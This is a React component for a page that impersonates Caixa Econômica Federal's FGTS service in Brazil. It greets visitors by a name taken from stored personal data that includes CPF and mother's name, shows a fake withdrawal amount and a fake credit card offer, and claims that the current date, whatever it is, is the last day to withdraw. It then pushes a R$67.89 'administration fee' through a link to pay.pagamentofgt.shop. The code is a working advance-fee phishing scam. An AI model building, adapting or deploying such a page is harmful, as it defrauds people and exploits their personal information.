import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import pix from "../assets/pix.png";
import { IoIosWarning } from "react-icons/io";
import { Helmet } from "react-helmet";
import { UserData } from "../types/userData";
import cartao from "../assets/cartao.png"
import logocaixa from "../assets/caixalogo.png"
import dayjs from "dayjs";

export function PagamentoTarifa() {
    const [displayedAmount, setDisplayedAmount] = useState(0);
    const saqueTotal = 3387.51;

    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        cep: "",
        cidade: "",
        estado: "",
        nomeMae: "",
        rua: "",
        numero: ""
    });

    // Carregar os dados do localStorage ao montar o componente
    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        // Animação do valor aumentando gradualmente até o saque total
        const interval = setInterval(() => {
            setDisplayedAmount((prev) => (prev < saqueTotal ? prev + 50 : saqueTotal));
        }, 50);
        return () => clearInterval(interval);
    }, [saqueTotal]);

    return (
        <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
            <Helmet>
                <title>Pagamento com Desconto</title>
            </Helmet>

            {/* Cabeçalho com logotipo, saudação e logo FGTS */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] ">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="Logo Caixa" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="Logo FGTS" width={65} />
                </div>
            </header>

            {/* Conteúdo principal */}
            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-4">
                <h1 className="text-3xl font-bold text-gray-800">VOCÊ TEM DINHEIRO<br />PARA RECEBER</h1>

                <h2 className="text-xl  text-red-600">Hoje, dia <span className="font-bold">{dayjs().format('DD/MM/YYYY')}</span> é o <span className="font-bold">último dia</span> para sacar seu FGTS </h2>

                {/* Informações sobre o saque disponível */}
                <div>
                    <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
                    <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
                </div>


                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                    <img src={cartao} alt="cartao" width={120} />
                    <div className="flex flex-col justify-normal">
                        <h3 className="font-semibold  text-xl text-zinc-700">+ Cartão de <span className="text-yellow-600">crédito</span></h3>
                        <span>R$15.000 de limite</span>
                    </div>
                </div>

                <div>
                    <div className="flex items-center justify-center space-x-1">
                        <div className="bg-primary p-2 w-fit rounded-full">
                            <img src={logocaixa} width={25} alt="" />
                        </div>
                        <p className="text-lg mb-2 text-primary font-medium">Taxa de administração Caixa:</p>
                    </div>
                    {/* <p className="text-2xl mb-2 text-zinc-400">DE: R$47,89</p> */}
                    <p className="text-4xl font-semibold text-primary">R$67,89</p>
                </div>

                {/* Botão de confirmação */}
                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
                        PAGAR TAXA E SACAR MEU FGTS
                    </button>
                </a>

                {/* Sessão com imagem do Pix e mensagem de justificativa */}
                <div className="flex flex-col items-center space-y-4">
                    <img src={pix} alt="Logo Pix" className="w-20 mt-4 mb-4" />
                    <p className="text-sm text-gray-600">
                        <IoIosWarning className="inline mr-1 text-yellow-500" />
                        Aproveite o desconto na taxa para receber em <strong>até 3 minutos</strong> via Pix.
                    </p>
                    <p className="text-xs text-gray-500 max-w-md">
                        Este valor já inclui o desconto da taxa para recebimento imediato via Pix,
                        proporcionando uma alternativa rápida e segura ao saque convencional.
                    </p>
                </div>



            </main>
        </div>
    );
}
